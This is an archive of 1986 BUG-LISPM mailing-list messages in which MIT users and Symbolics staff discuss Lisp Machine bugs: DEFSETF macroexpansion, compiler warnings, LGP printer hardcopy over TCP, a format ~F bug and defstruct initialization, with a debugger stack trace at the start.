    While in the function TCP:PROTOCOL-NAME-TCP-PORT  NETI:|MEDIUM-TCP-((NETWORK INTERNET))-G0663|  NETI:GET-CONNECTION-FOR-SERVICE-TO-HOST

    TCP:PROTOCOL-NAME-TCP-PORT:  (P.C. = 14)
       Arg 0 (TCP::PROTOCOL-NAME): :LGP
       Arg 1 (ERRORP): T

    NETI:|MEDIUM-TCP-((NETWORK INTERNET))-G0663|:  (P.C. = 13)
       Arg 0 (NETI:SERVICE-ACCESS-PATH): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>
       Rest arg (NETI:CONNECTION-ARGS): NIL

    NETI:GET-CONNECTION-FOR-SERVICE-TO-HOST:  (P.C. = 12)
       Arg 0 (NETI:SERVICE-ACCESS-PATH): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>
       Arg 1 (NET:NETWORK): #<INTERNET-NETWORK INTERNET 5540060>
       Arg 2 (NETI:IMPLEMENTATION): #<MEDIUM-IMPLEMENTATION 76654457>
       Arg 3 (NETI:CONNECTION-ARGS): NIL

    NETI:GET-CONNECTION-FOR-SERVICE-ON-MEDIUM:  (P.C. = 262)
       Arg 0 (NETI:MEDIUM): #<MEDIUM-DESCRIPTION on INTERNET 136471557>
       Arg 1 (NETI:SERVICE-ACCESS-PATH): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>
       Arg 2 (NETI:CONNECTION-ARGS): NIL

    NET:GET-CONNECTION-FOR-SERVICE:  (P.C. = 7)
       Arg 0 (NETI:SERVICE-ACCESS-PATH): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>
       Rest arg (NETI:CONNECTION-ARGS): NIL

    LGP:INVOKE-SERVICE-HARDCOPY-WITH-LGP:  (P.C. = 3)
       Arg 0 (NETI:.SERVICE.): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>

    NET:INVOKE-SERVICE-ACCESS-PATH:  (P.C. = 75)
       Arg 0 (NETI:SERVICE-ACCESS-PATH): #<SERVICE-ACCESS-PATH HARDCOPY (LGP) -- MIT-ATRP on INTERNET 136472054>
       Arg 1 (NETI:SERVICE-ARGS): (#<LGP-PRINTER LP 5540713> (:BANNER-FILE-NAME "Screen Hardcopy"))

    NET:INVOKE-SERVICE-ON-HOST:  (P.C. = 226)
       Arg 0 (NETI:SERVICE): :HARDCOPY
       Arg 1 (NET:HOST): #<UNIX-HOST MIT-ATRP 5542533>
       Rest arg (NETI:SERVICE-ARGS): (#<LGP-PRINTER LP 5540713> (:BANNER-FILE-NAME "Screen Hardcopy"))

    Rest of stack:
    (:METHOD SI:PRINTER :HARDCOPY-DEVICE-STREAM):  (P.C. = 34)
    (:METHOD SI:HARDCOPY-DEVICE-MIXIN :MAKE-HARDCOPY-STREAM):  (P.C. = 142)
    SI:MAKE-HARDCOPY-STREAM:  (P.C. = 52)
    TV:KBD-HARDCOPY-SHEET:  (P.C. = 56)
    TV:KBD-HARDCOPY-WHOLE-SCREEN:  (P.C. = 3)
    (:INTERNAL TV:KBD-ESC 1):  (P.C. = 4)
    SI:PROCESS-RUN-FUNCTION-INTERNAL:  (P.C. = 52)
    SI:PROCESS-TOP-LEVEL:  (P.C. = 54)



 4-Apr-86 19:24:28-EST,2321;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 4 Apr 86 19:24-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  4 Apr 86 19:18:36 EST
Received: from CREEPER.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 455878; Fri 4-Apr-86 18:42:40-EST
Date: Fri, 4 Apr 86 18:41  EST
From: Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Subject: trouble with SETF
To: Richard C. Waters <DICK@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860404152832.1.DICK@MERLIN.AI.MIT.EDU>
Message-ID: <860404184144.8.HORNIG@CREEPER.SCRC.Symbolics.COM>

    Date: Fri, 4 Apr 86 15:28 EST
    From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
    AISite 14.2, microcode TMC5-COL-MIC 353, FEP 127,
    FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on PA Lisp Machine Merlin:

In your failing control=3 case below, the BAR-SETF macro violates the
rule that "functions" used in DEFSETF forms must either be true
functions or macros that act like functions.  If you fix BAR-SETF to do
this, you will get consistent results.

The reason that the BAR-SETF macro is expanded is that the system is
trying to intelligently substitute the argument forms for the gensyms
and is confused by the macro that doesn't act like a function.

    In Common Lisp, evaluate the following set of definitions

	(declare (special control))
    
	(defmacro foo (x) `(bar ,x))
    
	(defun bar (x) (car x))
    
	(defmacro bar-setf (x z)
	  (case control
	    (0 `(zot ,x ,z))
	    (1 `(zot ,z))
	    (2 `(zot ,x))
	    (3 `zot))))
    
	(defsetf bar bar-setf))


    Then exectute

    (dolist (control '(0 1 2 3))
      (print (macroexpand-1 '(setf (foo a) b))))

    this produces the output:

    (zot a b)
    (zot b)
    (zot a)
    (bar-setf #:G0001 #:G0002)

    Note the odd last result which should have been ZOT
    Also note that for some reason the following works just fine.  
    Why aren't the two the same?

    (dolist (control '(0 1 2 3))
      (print (macroexpand-1 '(setf (bar a) b))))

    produces

    (bar-setf a b)
    (bar-setf a b)
    (bar-setf a b)
    (bar-setf a b)


					    Dick Waters

 4-Apr-86 19:25:26-EST,2534;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 4 Apr 86 19:25-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  4 Apr 86 19:18:50 EST
Received: from CREEPER.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 455885; Fri 4-Apr-86 18:51:07-EST
Date: Fri, 4 Apr 86 18:50  EST
From: Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Subject: trouble with SETF
To: Richard C. Waters <DICK@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860404152832.1.DICK@MERLIN.AI.MIT.EDU>
Supersedes: <860404184144.8.HORNIG@CREEPER.SCRC.Symbolics.COM>
Message-ID: <860404185014.9.HORNIG@CREEPER.SCRC.Symbolics.COM>

    Date: Fri, 4 Apr 86 15:28 EST
    From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
    AISite 14.2, microcode TMC5-COL-MIC 353, FEP 127,
    FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on PA Lisp Machine Merlin:

In your failing control=3 case below, the BAR-SETF macro violates the
rule that "functions" used in DEFSETF forms must either be true
functions or macros that act like functions.  If you fix BAR-SETF to do
this, you will get consistent results.

The reason that the BAR-SETF macro is expanded is that the system is
trying to intelligently substitute the argument forms for the gensyms
and is confused by the macro that doesn't act like a function.

    In Common Lisp, evaluate the following set of definitions

	(declare (special control))
    
	(defmacro foo (x) `(bar ,x))
    
	(defun bar (x) (car x))
    
	(defmacro bar-setf (x z)
	  (case control
	    (0 `(zot ,x ,z))
	    (1 `(zot ,z))
	    (2 `(zot ,x))
	    (3 `zot))))
    
	(defsetf bar bar-setf))


    Then exectute

    (dolist (control '(0 1 2 3))
      (print (macroexpand-1 '(setf (foo a) b))))

    this produces the output:

    (zot a b)
    (zot b)
    (zot a)
    (bar-setf #:G0001 #:G0002)

    Note the odd last result which should have been ZOT
    Also note that for some reason the following works just fine.  
    Why aren't the two the same?

    (dolist (control '(0 1 2 3))
      (print (macroexpand-1 '(setf (bar a) b))))

    produces

    (bar-setf a b)
    (bar-setf a b)
    (bar-setf a b)
    (bar-setf a b)

In the development version of the Symbolics system, this example
produces the same result as the previous one.  We fixed the "bug" that
made them different in release 6.

 4-Apr-86 19:25:39-EST,2909;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 4 Apr 86 19:25-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  4 Apr 86 19:18:53 EST
Received: from CREEPER.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 455887; Fri 4-Apr-86 18:51:56-EST
Date: Fri, 4 Apr 86 18:51  EST
From: Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Subject: another problem with setf
To: Richard C. Waters <DICK@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860404160521.2.DICK@MERLIN.AI.MIT.EDU>
Message-ID: <860404185101.0.HORNIG@CREEPER.SCRC.Symbolics.COM>

    Date: Fri, 4 Apr 86 16:05 EST
    From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
    AISite 14.2, microcode TMC5-COL-MIC 353, FEP 127,
    FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on PA Lisp Machine Merlin:

    Evaluate the following forms in Common Lisp.

	    (defmacro foo (x type) `(bar ,x ,type))
	    (defun bar (x type) (case type (:car (car x)) (:cdr (cdr x))))
	    (defmacro bar-setf (x type value)
	      (print (list x type value))
	      (case type
		(:car `(rplaca ,x ,value))
		(:cdr `(rplaca ,x ,value))
		(otherwise `(error ,x ,value))))
	    (defsetf bar bar-setf)


    Then evaluate

    (macroexpand-1 '(setf (foo a :car) 2))

    you get

    (#:G0001 #:G0002 #:G0003)
    (#:G0001 #:G0002 #:G0003)
    (ERROR A 2)

    It appears that setf is making the unwarranted assumption that you can substitute
    gensyms for the arguments to a macro and macroexpandit and then substitute in the
    actual values for the gensyms.  This is not true for example when one of the arguments
    is a keyword!

DEFSETF only works with macros if the macros treat their arguments just
as a function would.  For example, how would you expect

   (macroexpand-1 '(setf (foo a (read)) 2))

to expand?  It certainly has no right to do the (READ) at compile time.


    For some reason the following works just fine.
    why doesn't setf do the same thing in both cases?

    (macroexpand-1 '(setf (bar a :car) 2))

    produces

    (bar-setf a :car 2)

In the develpoment version of the Symbolics system, this example
produces exactly the same results as the previous one.  We fixed the
"bug".

    Note that I think that this is a quite separate problem with setf from the one I
    sent in a few minutes ago.  I need to have both of them fixed for the setf 
    property I am trying to define to work.

    Also using define-setf-method does not help, because although it does not have this
    problem.  It does have the other problem just as much as defsetf.

I don't see why DEFINE-SETF-METHOD has either problem.  With it you can
prevent the introduction of gensym's where you don't need them.

 5-Apr-86 04:10:18-EST,2063;000000000000
Received: from EDDIE.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 5 Apr 86 04:10-EST
Received: by EDDIE (5.31/4.7)
	id AA29005; Sat, 5 Apr 86 04:08:15 EST
Received: by MEDIA-LAB.MIT.EDU (5.31/4.8)  id AA07234; Sat, 5 Apr 86 04:11:54 EST
Date: Sat, 5 Apr 86 04:11:54 EST
From: Steve Strassmann <straz@MEDIA-LAB.MIT.EDU>
Message-Id: <8604050911.AA07234@MEDIA-LAB.MIT.EDU>
To: toto@GODZILLA.SCH.Symbolics.COM
Cc: BUG-LISPM@MEDIA-LAB.MIT.EDU
In-Reply-To: Kyra Lowther's message of Fri, 4 Apr 86 15:02 PST
Subject: getting Term-Q to work

Thanks, Kyra.
   Date: Fri, 4 Apr 86 15:02 PST
   From: Kyra Lowther <toto@GODZILLA.SCH.Symbolics.COM>

       Date: Thu, 13 Mar 86 20:42 EST
       From: Steve Strassmann <STRAZ@MEDIA-LAB.MIT.EDU>
       Function-Q has never worked at AMT...
       We currently have a DEC LN01 hanging off ATRP.

   The first problem is that the hardcopy service is only defined for
   CHAOS, so the invention: SERVICE HARDCOPY TCP LGP is a nice try,
   but won't work.

Oh well, nobody else told me this except Scott Jones of MIT-AI
recently, even though I sent this in almost a month ago.  I think all
my problems will be solved in the following way: I'll try to get the
lispm to FTP an LGP format file to a spooling directory, whereupon a
daemon will wake up and run a filter which converts LGP to LN01, and
send that to the printer.

   The second problem is that the DEC LN01 is not a supported printer.
   You might ask around on the SLUG mailing list to see if anyone has
   written code for it.
This seems to be the LGP->LN01 filter available from PREP.

   The third problem (which may be a moot point by now) is that the printer is 
   hanging off a UNIX VAX.  Hardcopy service is not supported for printers on 
   VAXen running UNIX.
Sheesh. I wonder how many Symbolics customers run Unix!

       Can Function-Q work with the color screen? The most naiive of
       implementations would be very useful.
   I don't think anything has been written for this.  
Yeah, I guess I'll do it myself.
 5-Apr-86 12:25:51-EST,1987;000000000000
Received: from EDDIE.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 5 Apr 86 12:25-EST
Received: by EDDIE (5.31/4.7)
	id AA06973; Sat, 5 Apr 86 12:23:37 EST
Received: by MEDIA-LAB.MIT.EDU (5.31/4.8)  id AA10847; Sat, 5 Apr 86 12:27:18 EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  5 Apr 86 12:25:14 EST
Received: from HARLEM.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 456216; Sat 5-Apr-86 12:22:57-EST
Date: Sat, 5 Apr 86 12:22  EST
From: Joseph R Goldstone <joseph@SAPSUCKER.SCRC.Symbolics.COM>
Subject: getting Term-Q to work
To: Steve Strassmann <straz@MEDIA-LAB.MIT.EDU>,
        toto@GODZILLA.SCH.Symbolics.COM
Cc: BUG-LISPM@MEDIA-LAB.MIT.EDU
In-Reply-To: <8604050911.AA07234@MEDIA-LAB.MIT.EDU>
Message-Id: <860405122209.3.JOSEPH@HARLEM.SCRC.Symbolics.COM>

    Date: Sat, 5 Apr 86 04:11:54 EST
    From: Steve Strassmann <straz@MEDIA-LAB.MIT.EDU>

    Thanks, Kyra.
       Date: Fri, 4 Apr 86 15:02 PST
       From: Kyra Lowther <toto@GODZILLA.SCH.Symbolics.COM>

	   Date: Thu, 13 Mar 86 20:42 EST
	   From: Steve Strassmann <STRAZ@MEDIA-LAB.MIT.EDU>
	   Function-Q has never worked at AMT...
	   We currently have a DEC LN01 hanging off ATRP.

       The first problem is that the hardcopy service is only defined for
       CHAOS, so the invention: SERVICE HARDCOPY TCP LGP is a nice try,
       but won't work.

    Oh well, nobody else told me this except Scott Jones of MIT-AI
    recently, even though I sent this in almost a month ago.  
I sent you mail about this the day your question arrived.  Sorry the mail
didn't get there.
							      I think all
    my problems will be solved in the following way: I'll try to get the
    lispm to FTP an LGP format file to a spooling directory, whereupon a
    daemon will wake up and run a filter which converts LGP to LN01, and
    send that to the printer.
Plausible.  You might look in sys:hardcopy;printer.lisp for strings like
":ITS-DOVER".


 5-Apr-86 13:45:37-EST,818;000000000000
Received: from CROSBY.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 5 Apr 86 13:45-EST
Date: Sat, 5 Apr 86 13:45 EST
From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>
Subject: bug with (declare (ignore ...))
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860405134507.1.DICK@CROSBY.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.2, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Bing Crosby:


In common lisp, the compiler issues error warnings for both of the following
even though it shouldn't.

(defmacro foo (x y)
  (declare (ignore x y))
  1)
(defun foo (x y)
  (declare (ignore x y))
  1)

				Dick Waters
 5-Apr-86 15:57:09-EST,1295;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 5 Apr 86 15:56-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  5 Apr 86 15:44:39 EST
Received: from FIREBIRD.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 456257; Sat 5-Apr-86 15:42:28-EST
Date: Sat, 5 Apr 86 15:40  EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: bug with (declare (ignore ...))
To: Richard C. Waters <DICK@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860405134507.1.DICK@CROSBY.AI.MIT.EDU>
Message-ID: <860405154052.5.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Sat, 5 Apr 86 13:45 EST
    From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
    AISite 14.2, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), on Lisp Machine Bing Crosby:


    In common lisp, the compiler issues error warnings for both of the following
    even though it shouldn't.

Release 7 generates no such warnings.

    (defmacro foo (x y)
      (declare (ignore x y))
      1)
    (defun foo (x y)
      (declare (ignore x y))
      1)

 6-Apr-86 20:50:14-EST,1976;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 6 Apr 86 20:50-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  6 Apr 86 20:51:01 EST
Received: from HARLEM.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 456571; Sun 6-Apr-86 20:47:11-EST
Date: Sun, 6 Apr 86 20:46  EST
From: Joseph R Goldstone <joseph@SAPSUCKER.SCRC.Symbolics.COM>
Subject: Performance Critique of LGP2 Streams
To: Chris Lindblad <CJL@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
cc: Bug-Hardcopy@SAPSUCKER.SCRC.Symbolics.COM
In-Reply-To: <860404131908.9.CJL@OTIS.AI.MIT.EDU>
Message-ID: <860406204630.1.JOSEPH@HARLEM.SCRC.Symbolics.COM>

    Date: Fri, 4 Apr 86 13:19 EST
    From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
    AISite 14.2, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
    FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
    FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

I don't have time right now to address most of the points below, but there's
one in particular:

    ...
    The size of the output file generated is also very large. Part of this
    is due to the number of ()pop commands in the file to work around
    laserwriter brain damage. Could the number of ()pop commands be reduced
    from once every page positioning command? With one page positioning
    command approximately every 4 characters (even more if floats are used),
    the output file becomes mostly ()pop commands. 

Check out the patch that Ed Taft of Adobe put out on info-postscript a day
or two ago.  I have found that downloading this patch lets you get rid of
the ()pop's.  On a 160+ page press file [the Flavors documentation], this
translated into a 20% reduction in the number of bits in the file.  Very
nice, the folks at Adobe are to be commended for tracking this down.

 6-Apr-86 22:29:01-EST,2069;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 6 Apr 86 22:28-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  6 Apr 86 22:28:19 EST
Received: from HARLEM.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 456601; Sun 6-Apr-86 22:25:56-EST
Date: Sun, 6 Apr 86 22:25  EST
From: Joseph R Goldstone <joseph@SAPSUCKER.SCRC.Symbolics.COM>
Subject: lgp:print-space-nums$ is incorrectly sensitive to value of base and *nopoint  
To: Chris Lindblad <CJL@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860323215426.5.CJL@OTIS.AI.MIT.EDU>
Message-ID: <860406222517.2.JOSEPH@HARLEM.SCRC.Symbolics.COM>
Character-Type-Mappings: (1 0 (NIL 0) (NIL :BOLD NIL) "CPTFONTCB")
Fonts: CPTFONT, CPTFONTCB

    Date: Sun, 23 Mar 86 21:54 EST
    From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
    AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
    FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
    FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

    was:

    (defun print-space-nums$ (stream &rest numbers)
      (dolist (n numbers)
	(princ " " stream)
	(if (or (fixp n) (stringp n))
	    (princ n stream)
	    (format stream "~$" n)))
      (terpri stream))

    should be:

    (defun print-space-nums$ (stream &rest numbers)
      (let ((base 10)
	    (*nopoint t))
	(dolist (n numbers)
	  (princ " " stream)
	  (if (or (fixp n) (stringp n))
	      (princ n stream)
	      (format stream "~$" n)))
	(terpri stream)))

I prefer

(defun 1print-space-nums$0 (stream &rest numbers)
  (let ((cl:*print-base* 10)
	(cl:*print-radix* nil))
    (dolist (n numbers)
      (princ " " stream)
      (if (or (fixp n) (stringp n))
	  (princ n stream)
	  (8bit-format stream "~$" n)))
    (terpri stream)))

but the general idea is certainly correct.  Thanks.  (Oh, the 8bit-format
is a crock that I hope to get rid of tomorrow.)

 7-Apr-86 15:25:55-EST,771;000000000000
Received: from ELVIS.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 7 Apr 86 15:25-EST
Date: Mon, 7 Apr 86 15:25 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: defstruct optimization
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860407152539.2.ZVONA@ELVIS.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.3, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Elvis Presley:

(defstruct (foo)
  (bar '()))

(make-foo) 
 ==> 
((LAMBDA (#:G1008) (ASET 'NIL #:G1008 0) #:G1008) (MAKE-ARRAY 1)) 

It's unnecessary to initialize to nil.  I bet this happens an awful lot. 
 7-Apr-86 20:29:25-EST,1327;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 7 Apr 86 20:29-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU  7 Apr 86 20:30:34 EST
Received: from CUYAHOGA.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 457570; Mon 7-Apr-86 20:27:48-EST
Date: Mon, 7 Apr 86 20:27 EST
From: Robert A. Cassels <Cassels@TENEX.SCRC.Symbolics.COM>
Subject: CL Format Bug   ~F.
To: TAR@MC.LCS.MIT.EDU, BUG-LISPM@MC.LCS.MIT.EDU
In-Reply-To: <[MC.LCS.MIT.EDU].863844.860327.TAR>
Message-ID: <860407202723.2.CASSELS@CUYAHOGA.SCRC.Symbolics.COM>
Reply-To: Robert A. Cassels <Cassels@SCRC-STONY-BROOK.ARPA>

    Date: Thu, 27 Mar 86 17:02:53 EST
    From: "Thomas A. Russ" <TAR@MC.LCS.MIT.EDU>


    Release 6.1


    There is a bug in the Common Lisp format for ~F format.  It
    appears when printing a floating point zero in a field of
    a width larger than necessary.

    For example:

	    (format nil "~7F" 0.0)		==>	"   0.00"

    instead of producing "    0.0"
    This is not a problem with larger numbers such as

	    (format nil "~7F" 1.0)		==>	"    1.0"

    which is correct.

    Tom.

Thanks for the report.  [There are a lot of special cases in ~F, ~G, and
~E, as you can guess just by reading CLtL.]  This will be fixed in the
next release.

 8-Apr-86 10:06:36-EST,5285;000000000000
Mail-From: DICK created at  8-Apr-86 10:06:29
Date: Tue, 8 Apr 1986  10:06 EST
Message-ID: <DICK.12197201049.BABYL@MIT-OZ>
Sender: DICK@OZ.AI.MIT.EDU
From: Dick@MC.LCS.MIT.EDU
To:   Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Cc:   BUG-LISPM@OZ.AI.MIT.EDU
Subject: trouble with SETF
In-reply-to: Msg of Fri 4 Apr 86 18:50  EST from Charles Hornig <Hornig at SCRC-RIVERSIDE.ARPA>

    Date: Fri, 4 Apr 86 18:50  EST
    From: Charles Hornig <Hornig at SCRC-RIVERSIDE.ARPA>

        Date: Fri, 4 Apr 86 15:28 EST
        From: Richard C. Waters <DICK@OZ.AI.MIT.EDU>

        In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
        AISite 14.2, microcode TMC5-COL-MIC 353, FEP 127,
        FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
        FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), 
             on PA Lisp Machine Merlin:
  
  I would like to make several concrete suggestions with regard to the
problem below.  First, may I suggest that the documentation should be
very explicit about the "rule" that defsetf functions must be actual 
functions (or function like macros) and not more complex macros.  I do
not think that this is clear in the current documentation; at least not
in the Common Lisp book.  You might even consider requiring that they
actually be functions or substs.  This would at least be easy to check and
clear to the programmer.  Although it would be irritating.
  Second, may I suggest that as it currently works, defsetf has a
rather unfortunate failure mode in that it creates code with unbound
gensyms in it.  It seems to me that it could have fallen back on
either just using what the macro returned (ie ZOT).  This is what it
did in the first two cases) or it should fall back on just using the
form it started with namely:
    (let ((#:G0001 a) (#:G0002 b))
      (bar-setf #:G0001 #:G0002))
This is what it does in some other situations.
   It seems to me that setf could be made much more robust by having
it be ready to fall back on the let form any time it is even slightly
confused.  The only cost of this would be effeciency and you would get
effeciency whenever you followed the "rule".  (May I also note that
some times when setf gets confused it issues warnings about it.  I
think that this feature should be removed.  If the warnings have
really located a problem, the compiler will locate it too and issue a
better warning later.)
  A separate point is that DEFINE-SETF-METHOD has the same problem
being discussed here.  (Although it seems to be the case that bar has
to take 2 arguments and bar-setf 3 arguments in order to trigger it.)
You would think that define-setf-method would not have the problem
because, with define-setf-method you can prevent there from being any
gensyms used for the arguments to bar.  However, you cannot prevent
there from being a gensym for the value being stored.  As a result,
setf goes right ahead and tries to macroexpand everything in order to
try and get rid of this gensym.  I think that define-setf-method
should give you the actual value to be stored rather than just a
gensym for it and allow you to just give back the exact form you want.
This would be trivial to do and allow you to get around all of this
trouble when you want to do something weird.
  A final point is that I do not understand why setf is going through
all this effort to symplify the coded produced by setf.  Zeta-Lisp has
definitly evolved into a compiled language.  (The fact that no real
attempt is being made to gain interpreted efficiency is obvious from
the fact that macros do not, in general, displace themselves with their
expansions in code as they did in maclisp.  This is such a horrendous
source of interpreted inefficiency that nothing else matters at that
level.)
  Therefore the only use of the work that setf is doing is to produce
better compiled code.  For this may I suggest that the work which setf
is doing should be moved to the compiler where all the code would
benefit from attempts to get rid of unneeded variables.  Also the
compiler has the completely macroexpanded code available to it and
could do a much better job.


    In your failing control=3 case below, the BAR-SETF macro violates the
    rule that "functions" used in DEFSETF forms must either be true
    functions or macros that act like functions.  If you fix BAR-SETF to do
    this, you will get consistent results.

    The reason that the BAR-SETF macro is expanded is that the system is
    trying to intelligently substitute the argument forms for the gensyms
    and is confused by the macro that doesn't act like a function.

        In Common Lisp, evaluate the following set of definitions
    	(declare (special control))
    	(defmacro foo (x) `(bar ,x))
    	(defun bar (x) (car x))
    	(defmacro bar-setf (x z)
    	  (case control
    	    (0 `(zot ,x ,z))
    	    (1 `(zot ,z))
    	    (2 `(zot ,x))
    	    (3 `zot)))
    	(defsetf bar bar-setf))

        Then exectute
        (dolist (control '(0 1 2 3))
          (print (macroexpand-1 '(setf (foo a) b))))

        this produces the output:
        (zot a b)
        (zot b)
        (zot a)
        (bar-setf #:G0001 #:G0002)

 8-Apr-86 10:28:58-EST,3812;000000000000
Mail-From: DICK created at  8-Apr-86 10:28:52
Date: Tue, 8 Apr 1986  10:28 EST
Message-ID: <DICK.12197205126.BABYL@MIT-OZ>
Sender: DICK@OZ.AI.MIT.EDU
From: Dick@MC.LCS.MIT.EDU
To:   Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Cc:   BUG-LISPM@OZ.AI.MIT.EDU
Subject: another problem with setf
In-reply-to: Msg of Fri 4 Apr 86 18:51  EST from Charles Hornig <Hornig at SCRC-RIVERSIDE.ARPA>


I suppose that this is a dumb question, but if I use the simplest form
of detsetf and say.
  (defsetf zot baz)
Then I am asserting that instances of 
  (setf (zot a b c) v) 
should become instances of 
  (baz a b c v)
In this simple case, Why is setf playing with gensyms?  Why is it
doing macroexpansions and trying to do simplifications?  Since baz
takes the exact right arguments in exactly the right order and returns
exactly the right value, you don't ever need a let or anything.  What
result can setf be hoping to get that could possibly be more effecient
